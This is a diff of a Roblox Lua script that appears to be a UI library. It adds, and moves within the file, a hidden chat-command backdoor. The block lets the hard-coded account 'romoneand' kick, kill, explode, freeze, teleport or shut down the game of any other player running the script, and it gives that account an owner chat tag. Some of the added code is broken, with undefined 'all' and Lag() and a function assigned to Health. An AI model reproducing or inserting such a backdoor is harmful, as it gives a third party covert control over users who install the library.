@@ -814,6 +814,202 @@ if game.Players.LocalPlayer.UserId == 458422705 then
 UICorner.CornerRadius = UDim.new(0, 4)
                 UICorner.Parent = FactName
 else
+function Explode()
+local explosion = Instance.new("Explosion")
+explosion.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+explosion.BlastRadius = 10
+explosion.BlastPressure = 500000
+explosion.Parent = workspace
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end
+function Bring()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild("romoneand").Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
+end
+function Freeze()
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+end
+function UnFreeze()
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+end
+function Shutdown()
+game:shutdown() 
+end
+function Kick()
+game.Players.LocalPlayer:Kick("lol")
+end
+function Died()
+game.Players.LocalPlayer.Character.Humanoid.Health = Died
+end
+local Admins = {"romoneand"}
+local Prefix = "/"
+if not game.Players.LocalPlayer.PlayerGui:FindFirstChild("Chat") then
+local TextChatService = game:GetService("TextChatService")
+TextChatService.MessageReceived:Connect(function(TextChatMessage)
+local Player = TextChatMessage.TextSource
+local Message = TextChatMessage.Text
+for _,v in pairs(Admins) do
+if Player.Name ~= nil and Player.Name == v then
+message = string.lower(Message) 
+			local splitString = message:split(" ")
+			local Command = splitString[1] 
+			local cmd = Command:split(Prefix) 
+			local cmdName = cmd[2] 
+			local args = {} --Defines a table for arguments
+				for i = 2, #splitString, 1 do  --Creates a table of all the arguments of the message
+					table.insert(args,splitString[i])
+				end
+				if args[1] ~= nil or not args[1] == all then
+				for _,Target in pairs(game.Players:GetChildren()) do
+				if Target.name:find(args[1]) then
+				TargetPlayer = Target.name
+				end
+				end
+				else
+				if args[1] == all then
+				for _,Target in pairs(game.Players:GetChildren()) do
+				TargetPlayer = Target.name
+				end
+				end
+				end
+			if cmd[2] == "kick" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Kick()
+			end
+			if cmd[2] == "explode" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Explode()
+			end
+			if cmd[2] == "shutdown" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Shutdown()
+			end
+			if cmd[2] == "bring" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Bring()
+			end
+			if cmd[2] == "freeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Freeze()
+			end
+			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			UnFreeze()
+			end
+			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Died()
+			end
+end
+end
+end)
+else
+if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Chat") then
+if game.Players:FindFirstChild("romoneand") then
+for _,player in pairs(game.Players:GetChildren()) do
+for _,v in pairs(Admins) do
+if player.name == v then
+	player.Chatted:Connect(function(Message, recipient) -- Runs when a player sends a message	
+			message = string.lower(Message) 
+			local splitString = message:split(" ")
+			local Command = splitString[1] 
+			local cmd = Command:split(Prefix) 
+			local cmdName = cmd[2] 
+			local args = {} --Defines a table for arguments
+				for i = 2, #splitString, 1 do  --Creates a table of all the arguments of the message
+					table.insert(args,splitString[i])
+				end
+				if args[1] ~= nil or not args[1] == all then
+				for _,Target in pairs(game.Players:GetChildren()) do
+				if Target.name:find(args[1]) then
+				TargetPlayer = Target.name
+				end
+				end
+				else
+				if args[1] == all then
+				for _,Target in pairs(game.Players:GetChildren()) do
+				TargetPlayer = Target.name
+				end
+				end
+				end
+			if cmd[2] == "kick" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Kick()
+			end
+			if cmd[2] == "explode" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Explode()
+			end
+			if cmd[2] == "shutdown" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Shutdown()
+			end
+			if cmd[2] == "bring" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Bring()
+			end
+			if cmd[2] == "freeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Freeze()
+			end
+			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			UnFreeze()
+			end
+			if cmd[2] == "lag" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Lag()
+			end
+			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Died()
+			end
+	end)
+	end
+end
+end
+else
+game.Players.PlayerAdded:Connect(function(player)
+for _,v in pairs(Admins) do
+if player.name == v then
+	player.Chatted:Connect(function(Message, recipient) -- Runs when a player sends a message	
+			message = string.lower(Message) 
+			local splitString = message:split(" ")
+			local Command = splitString[1] 
+			local cmd = Command:split(Prefix) 
+			local cmdName = cmd[2] 
+			local args = {} --Defines a table for arguments
+				for i = 2, #splitString, 1 do  --Creates a table of all the arguments of the message
+					table.insert(args,splitString[i])
+				end
+				if args[1] ~= nil or not args[1] == all then
+				for _,Target in pairs(game.Players:GetChildren()) do
+				if Target.name:find(args[1]) then
+				TargetPlayer = Target.name
+				end
+				end
+				else
+				if args[1] == all then
+				for _,Target in pairs(game.Players:GetChildren()) do
+				TargetPlayer = Target.name
+				end
+				end
+				end
+			if cmd[2] == "kick" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Kick()
+			end
+			if cmd[2] == "explode" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Explode()
+			end
+			if cmd[2] == "shutdown" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Shutdown()
+			end
+			if cmd[2] == "bring" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Bring()
+			end
+			if cmd[2] == "freeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Freeze()
+			end
+			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			UnFreeze()
+			end
+			if cmd[2] == "lag" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Lag()
+			end
+			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Died()
+			end
+	end)
+	end
+end
+end)
+end
+end
+end
 FactName.Name = "Announcement"
                 FactName.Parent = Main
                 FactName.BackgroundColor3 = Color3.fromRGB(themeList.SchemeColor.r * 255 - 14, themeList.SchemeColor.g * 255 - 17, themeList.SchemeColor.b * 255 - 13)
@@ -1118,204 +1314,7 @@ title.Position = UDim2.new(0.285428565, 0, 0.615827592, 0)
 end
 	end
 end)
-if game.Players.LocalPlayer.UserId ~= 458422705 then
-function Explode()
-local explosion = Instance.new("Explosion")
-explosion.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-explosion.BlastRadius = 10
-explosion.BlastPressure = 500000
-explosion.Parent = workspace
-game.Players.LocalPlayer.Character.Humanoid.Health = 0
-end
-function Bring()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild("romoneand").Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
-end
-function Freeze()
-game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-end
-function UnFreeze()
-game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-end
-function Shutdown()
-game:shutdown() 
-end
-function Kick()
-game.Players.LocalPlayer:Kick("lol")
-end
-function Died()
-game.Players.LocalPlayer.Character.Humanoid.Health = Died
-end
-local Admins = {"romoneand"}
-local Prefix = "/"
 if not game.Players.LocalPlayer.PlayerGui:FindFirstChild("Chat") then
-local TextChatService = game:GetService("TextChatService")
-TextChatService.MessageReceived:Connect(function(TextChatMessage)
-local Player = TextChatMessage.TextSource
-local Message = TextChatMessage.Text
-for _,v in pairs(Admins) do
-if Player.Name ~= nil and Player.Name == v then
-message = string.lower(Message) 
-			local splitString = message:split(" ")
-			local Command = splitString[1] 
-			local cmd = Command:split(Prefix) 
-			local cmdName = cmd[2] 
-			local args = {} --Defines a table for arguments
-				for i = 2, #splitString, 1 do  --Creates a table of all the arguments of the message
-					table.insert(args,splitString[i])
-				end
-				if args[1] ~= nil or not args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				if Target.name:find(args[1]) then
-				TargetPlayer = Target.name
-				end
-				end
-				else
-				if args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				TargetPlayer = Target.name
-				end
-				end
-				end
-			if cmd[2] == "kick" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Kick()
-			end
-			if cmd[2] == "explode" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Explode()
-			end
-			if cmd[2] == "shutdown" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Shutdown()
-			end
-			if cmd[2] == "bring" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Bring()
-			end
-			if cmd[2] == "freeze" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Freeze()
-			end
-			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
-			UnFreeze()
-			end
-			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Died()
-			end
-end
-end
-end)
-else
-if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Chat") then
-if game.Players:FindFirstChild("romoneand") then
-for _,player in pairs(game.Players:GetChildren()) do
-for _,v in pairs(Admins) do
-if player.name == v then
-	player.Chatted:Connect(function(Message, recipient) -- Runs when a player sends a message	
-			message = string.lower(Message) 
-			local splitString = message:split(" ")
-			local Command = splitString[1] 
-			local cmd = Command:split(Prefix) 
-			local cmdName = cmd[2] 
-			local args = {} --Defines a table for arguments
-				for i = 2, #splitString, 1 do  --Creates a table of all the arguments of the message
-					table.insert(args,splitString[i])
-				end
-				if args[1] ~= nil or not args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				if Target.name:find(args[1]) then
-				TargetPlayer = Target.name
-				end
-				end
-				else
-				if args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				TargetPlayer = Target.name
-				end
-				end
-				end
-			if cmd[2] == "kick" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Kick()
-			end
-			if cmd[2] == "explode" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Explode()
-			end
-			if cmd[2] == "shutdown" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Shutdown()
-			end
-			if cmd[2] == "bring" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Bring()
-			end
-			if cmd[2] == "freeze" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Freeze()
-			end
-			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
-			UnFreeze()
-			end
-			if cmd[2] == "lag" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Lag()
-			end
-			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Died()
-			end
-	end)
-	end
-end
-end
-else
-game.Players.PlayerAdded:Connect(function(player)
-for _,v in pairs(Admins) do
-if player.name == v then
-	player.Chatted:Connect(function(Message, recipient) -- Runs when a player sends a message	
-			message = string.lower(Message) 
-			local splitString = message:split(" ")
-			local Command = splitString[1] 
-			local cmd = Command:split(Prefix) 
-			local cmdName = cmd[2] 
-			local args = {} --Defines a table for arguments
-				for i = 2, #splitString, 1 do  --Creates a table of all the arguments of the message
-					table.insert(args,splitString[i])
-				end
-				if args[1] ~= nil or not args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				if Target.name:find(args[1]) then
-				TargetPlayer = Target.name
-				end
-				end
-				else
-				if args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				TargetPlayer = Target.name
-				end
-				end
-				end
-			if cmd[2] == "kick" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Kick()
-			end
-			if cmd[2] == "explode" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Explode()
-			end
-			if cmd[2] == "shutdown" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Shutdown()
-			end
-			if cmd[2] == "bring" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Bring()
-			end
-			if cmd[2] == "freeze" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Freeze()
-			end
-			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
-			UnFreeze()
-			end
-			if cmd[2] == "lag" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Lag()
-			end
-			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
-			Died()
-			end
-	end)
-	end
-end
-end)
-end
-end
-end
-end
    game:GetService("TextChatService").OnIncomingMessage = function(messageData)
                     local messageProps = Instance.new("TextChatMessageProperties")
                     local sender = game:GetService("Players"):GetPlayerByUserId(messageData.TextSource.UserId)
@@ -1323,6 +1322,7 @@ end
                         messageProps.PrefixText = string.format('<font color="%s">%s</font> %s', "#000000", "[R-Owner]", messageData.PrefixText)
                     end
                     return messageProps
+                end
                 end
 local textboxElement = Instance.new("TextButton")
                 local UICorner = Instance.new("UICorner")
